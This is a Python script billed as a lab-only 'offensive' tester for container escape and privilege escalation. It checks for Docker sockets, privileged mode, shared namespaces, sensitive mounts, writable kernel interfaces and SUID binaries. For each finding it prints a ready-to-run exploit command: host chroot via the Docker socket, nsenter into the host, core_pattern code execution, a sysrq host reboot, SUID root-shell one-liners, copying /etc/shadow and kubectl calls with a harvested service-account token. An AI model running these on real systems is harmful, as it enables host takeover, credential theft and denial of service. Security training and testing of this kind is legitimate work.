#!/usr/bin/env python3
# LAB-ONLY: Container Escape & Privilege Escalation Tester
# CEH v13 Ultimate Offensive Script 10
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
#
# PURPOSE: Actively detects container escape vectors by inspecting the
# runtime environment. Returns ACTIONABLE findings, not just descriptions.
import sys
import os
import stat
import subprocess
import json
import platform
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════
REPORT_FILE = "container-escape-report.json"

# ═══════════════════════════════════════════════════════════════════════════════
# DETECTION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class ContainerEscapeTester:
    def __init__(self):
        self.findings = []
        self.is_container = False

    def log(self, severity, title, detail, exploit_cmd=""):
        entry = {
            "severity": severity,
            "title": title,
            "detail": detail,
            "exploit_cmd": exploit_cmd,
            "timestamp": datetime.now().isoformat()
        }
        self.findings.append(entry)
        icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢", "INFO": "🔵"}
        print(f"  {icon.get(severity, '⚪')} [{severity}] {title}")
        if detail:
            print(f"      → {detail}")
        if exploit_cmd:
            print(f"      ⚡ Exploit: {exploit_cmd}")

    # ─── Check 1: Are we inside a container? ─────────────────────────────────
    def check_container_environment(self):
        print("\n[1/8] Detecting container environment...")
        indicators = []

        # Check /.dockerenv
        if os.path.exists("/.dockerenv"):
            indicators.append("/.dockerenv exists")
            self.is_container = True

        # Check cgroup for docker/lxc/kubepods
        try:
            with open("/proc/1/cgroup", "r") as f:
                cgroup = f.read()
                for marker in ["docker", "lxc", "kubepods", "containerd"]:
                    if marker in cgroup:
                        indicators.append(f"/proc/1/cgroup contains '{marker}'")
                        self.is_container = True
        except (FileNotFoundError, PermissionError):
            pass

        # Check for container-specific env vars
        for var in ["KUBERNETES_SERVICE_HOST", "DOCKER_HOST", "container"]:
            if os.environ.get(var):
                indicators.append(f"Environment variable {var}={os.environ[var]}")
                self.is_container = True

        # Check hostname pattern (Docker uses short hex IDs)
        hostname = platform.node()
        if len(hostname) == 12 and all(c in "0123456789abcdef" for c in hostname):
            indicators.append(f"Hostname '{hostname}' matches Docker container ID pattern")
            self.is_container = True

        if self.is_container:
            self.log("INFO", "Running inside a container", "; ".join(indicators))
        else:
            self.log("INFO", "Not running inside a container (or undetected)", "Host-level checks will still run")

    # ─── Check 2: Docker socket mounted ──────────────────────────────────────
    def check_docker_socket(self):
        print("\n[2/8] Checking for mounted Docker socket...")
        socket_paths = ["/var/run/docker.sock", "/run/docker.sock", "/host/var/run/docker.sock"]
        for sock in socket_paths:
            if os.path.exists(sock):
                try:
                    mode = os.stat(sock).st_mode
                    writable = os.access(sock, os.W_OK)
                    self.log(
                        "CRITICAL",
                        f"Docker socket found: {sock} (writable={writable})",
                        "Full host escape possible — can create privileged containers on the host",
                        f"docker -H unix://{sock} run -v /:/host --privileged -it alpine chroot /host"
                    )
                except PermissionError:
                    self.log("HIGH", f"Docker socket found: {sock} (permission denied)", "Socket exists but current user cannot access it")
                return
        self.log("LOW", "No Docker socket found", "Socket-based escape not possible")

    # ─── Check 3: Privileged mode ────────────────────────────────────────────
    def check_privileged_mode(self):
        print("\n[3/8] Checking for --privileged mode...")
        try:
            # In privileged mode, /dev contains many more device nodes
            dev_count = len(os.listdir("/dev"))
            # Privileged containers typically have 200+ devices
            if dev_count > 200:
                self.log(
                    "CRITICAL",
                    f"Privileged container detected ({dev_count} devices in /dev)",
                    "Full host filesystem accessible via device mounting",
                    "mkdir /tmp/host && mount /dev/sda1 /tmp/host && chroot /tmp/host"
                )
                return
        except PermissionError:
            pass

        # Check for SYS_ADMIN capability via capsh or /proc
        try:
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if line.startswith("CapEff:"):
                        cap_hex = int(line.split(":")[1].strip(), 16)
                        # CAP_SYS_ADMIN is bit 21
                        if cap_hex & (1 << 21):
                            self.log(
                                "CRITICAL",
                                "CAP_SYS_ADMIN capability detected",
                                "Can mount host filesystems, create namespaces, and escape container",
                                "mount -t cgroup2 none /tmp/cgrp && echo 1 > /tmp/cgrp/notify_on_release"
                            )
                            return
                        # CAP_NET_RAW for network sniffing
                        if cap_hex & (1 << 13):
                            self.log("MEDIUM", "CAP_NET_RAW capability detected", "Can perform ARP spoofing and packet sniffing within container network")
                        # CAP_SYS_PTRACE for process injection
                        if cap_hex & (1 << 19):
                            self.log("HIGH", "CAP_SYS_PTRACE capability detected", "Can attach to and inject into host processes via shared PID namespace")
                        # Decode full effective capabilities
                        self.log("INFO", f"Effective capabilities: 0x{cap_hex:016x}", f"Decoded: {bin(cap_hex).count('1')} capabilities enabled")
                        return
        except (FileNotFoundError, PermissionError):
            pass
        self.log("LOW", "Not running in privileged mode", "Standard container isolation is in place")

    # ─── Check 4: Host PID namespace ─────────────────────────────────────────
    def check_pid_namespace(self):
        print("\n[4/8] Checking PID namespace sharing...")
        try:
            # If host PID namespace is shared, we can see host processes
            pids = [int(p) for p in os.listdir("/proc") if p.isdigit()]
            # Isolated containers typically have < 50 processes
            if len(pids) > 100:
                host_processes = []
                for pid in sorted(pids)[:5]:
                    try:
                        with open(f"/proc/{pid}/cmdline", "r") as f:
                            cmd = f.read().replace("\x00", " ").strip()
                            if cmd:
                                host_processes.append(f"PID {pid}: {cmd[:60]}")
                    except (FileNotFoundError, PermissionError):
                        pass
                self.log(
                    "HIGH",
                    f"Host PID namespace shared ({len(pids)} processes visible)",
                    "Can see and potentially inject into host processes. Sample: " + "; ".join(host_processes[:3]),
                    "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"
                )
                return
        except (FileNotFoundError, PermissionError):
            pass
        self.log("LOW", "PID namespace is isolated", "Cannot see host processes")

    # ─── Check 5: Host network namespace ─────────────────────────────────────
    def check_network_namespace(self):
        print("\n[5/8] Checking network namespace...")
        try:
            # Check if we can see host network interfaces
            result = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=5)
            interfaces = [l.strip() for l in result.stdout.split("\n") if ": " in l and "@" not in l]
            # More than 3 interfaces suggests host networking
            if len(interfaces) > 3:
                self.log(
                    "HIGH",
                    f"Possible host network namespace ({len(interfaces)} interfaces)",
                    "Container shares host network stack — can sniff all host traffic",
                    "tcpdump -i any -w /tmp/host-capture.pcap"
                )
                return
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        self.log("LOW", "Network namespace appears isolated", "Standard container networking")

    # ─── Check 6: Sensitive host mounts ──────────────────────────────────────
    def check_sensitive_mounts(self):
        print("\n[6/8] Checking for sensitive host mounts...")
        sensitive_paths = {
            "/etc/shadow": "CRITICAL — Host password hashes accessible",
            "/etc/passwd": "HIGH — Host user enumeration",
            "/root": "CRITICAL — Host root home directory mounted",
            "/home": "HIGH — Host user home directories mounted",
            "/var/log": "MEDIUM — Host logs accessible for recon",
            "/etc/kubernetes": "CRITICAL — Kubernetes configs with cluster credentials",
            "/var/run/secrets/kubernetes.io": "CRITICAL — Kubernetes service account token",
        }
        found_any = False
        for path, desc in sensitive_paths.items():
            if os.path.exists(path):
                try:
                    # Check if it looks like host content (not container's own)
                    readable = os.access(path, os.R_OK)
                    severity = desc.split(" — ")[0]
                    detail = desc.split(" — ")[1]
                    if readable:
                        self.log(severity, f"Sensitive path accessible: {path}", detail)
                        found_any = True
                except Exception:
                    pass

        # Check Kubernetes service account token specifically
        k8s_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        if os.path.exists(k8s_token_path):
            try:
                with open(k8s_token_path, "r") as f:
                    token = f.read().strip()[:30]
                    self.log(
                        "CRITICAL",
                        "Kubernetes service account token found",
                        f"Token prefix: {token}...",
                        f"kubectl --token=$(cat {k8s_token_path}) --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT --insecure-skip-tls-verify get pods"
                    )
            except PermissionError:
                pass

        if not found_any:
            self.log("LOW", "No sensitive host mounts detected", "Standard container filesystem")

    # ─── Check 7: Writable sysfs/procfs ──────────────────────────────────────
    def check_writable_sysfs(self):
        print("\n[7/8] Checking writable kernel interfaces...")
        writable_targets = [
            ("/proc/sysrq-trigger", "CRITICAL", "Can crash host kernel", "echo b > /proc/sysrq-trigger  # REBOOT HOST"),
            ("/proc/sys/kernel/core_pattern", "CRITICAL", "Can execute code on host via core dump handler", "echo '|/tmp/exploit.sh' > /proc/sys/kernel/core_pattern"),
            ("/sys/fs/cgroup", "HIGH", "Cgroup escape possible", "See release_agent escape technique"),
        ]
        found_any = False
        for path, severity, desc, exploit in writable_targets:
            if os.path.exists(path) and os.access(path, os.W_OK):
                self.log(severity, f"Writable kernel interface: {path}", desc, exploit)
                found_any = True
        if not found_any:
            self.log("LOW", "Kernel interfaces are read-only", "Standard container protections active")

    # ─── Check 8: SUID binaries ──────────────────────────────────────────────
    def check_suid_binaries(self):
        print("\n[8/8] Scanning for SUID/SGID binaries...")
        dangerous_suids = {
            "python": "Spawn root shell: python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "python3": "Spawn root shell: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "find": "find / -exec /bin/bash -p \\;",
            "vim": "vim -c ':!/bin/bash'",
            "nmap": "nmap --interactive → !sh",
            "bash": "bash -p",
            "cp": "cp /etc/shadow /tmp/shadow.bak && cat /tmp/shadow.bak",
            "chmod": "chmod u+s /bin/bash && bash -p",
            "pkexec": "CVE-2021-4034 PwnKit exploit",
        }
        try:
            result = subprocess.run(
                ["find", "/", "-perm", "-4000", "-type", "f"],
                capture_output=True, text=True, timeout=15
            )
            suid_files = [f.strip() for f in result.stdout.split("\n") if f.strip()]
            for suid in suid_files:
                basename = os.path.basename(suid)
                if basename in dangerous_suids:
                    self.log("CRITICAL", f"Dangerous SUID binary: {suid}", "Privilege escalation possible", dangerous_suids[basename])
                else:
                    self.log("INFO", f"SUID binary: {suid}", "Review manually for abuse potential")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            self.log("INFO", "Could not scan for SUID binaries", "find command not available or timed out")

    # ─── Run all checks ──────────────────────────────────────────────────────
    def run(self):
        print("=" * 80)
        print("  🐳 CONTAINER ESCAPE & PRIVILEGE ESCALATION TESTER")
        print("  LAB-ONLY — CEH v13 Ultimate Offensive Script 10")
        print("=" * 80)
        print(f"  Host: {platform.node()}")
        print(f"  OS:   {platform.platform()}")
        print(f"  User: {os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))}")
        print(f"  UID:  {os.getuid() if hasattr(os, 'getuid') else 'N/A (Windows)'}")
        print("=" * 80)

        self.check_container_environment()
        self.check_docker_socket()
        self.check_privileged_mode()
        self.check_pid_namespace()
        self.check_network_namespace()
        self.check_sensitive_mounts()
        self.check_writable_sysfs()
        self.check_suid_binaries()

        # ─── Summary ─────────────────────────────────────────────────────────
        print("\n" + "=" * 80)
        print("  📊 RESULTS SUMMARY")
        print("=" * 80)
        severity_counts = {}
        for f in self.findings:
            severity_counts[f["severity"]] = severity_counts.get(f["severity"], 0) + 1
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            count = severity_counts.get(sev, 0)
            if count:
                print(f"  {sev:10s}: {count}")
        print(f"\n  Total findings: {len(self.findings)}")

        criticals = [f for f in self.findings if f["severity"] == "CRITICAL"]
        if criticals:
            print(f"\n  🔴 {len(criticals)} CRITICAL escape vector(s) detected!")
            for c in criticals:
                print(f"     → {c['title']}")
        else:
            print("\n  🟢 No critical escape vectors detected.")

        # Save report
        try:
            with open(REPORT_FILE, "w") as f:
                json.dump({"scan_time": datetime.now().isoformat(), "findings": self.findings}, f, indent=2)
            print(f"\n  📄 Full report saved to: {REPORT_FILE}")
        except Exception as e:
            print(f"\n  ⚠️  Could not save report: {e}")


if __name__ == "__main__":
    tester = ContainerEscapeTester()
    tester.run()
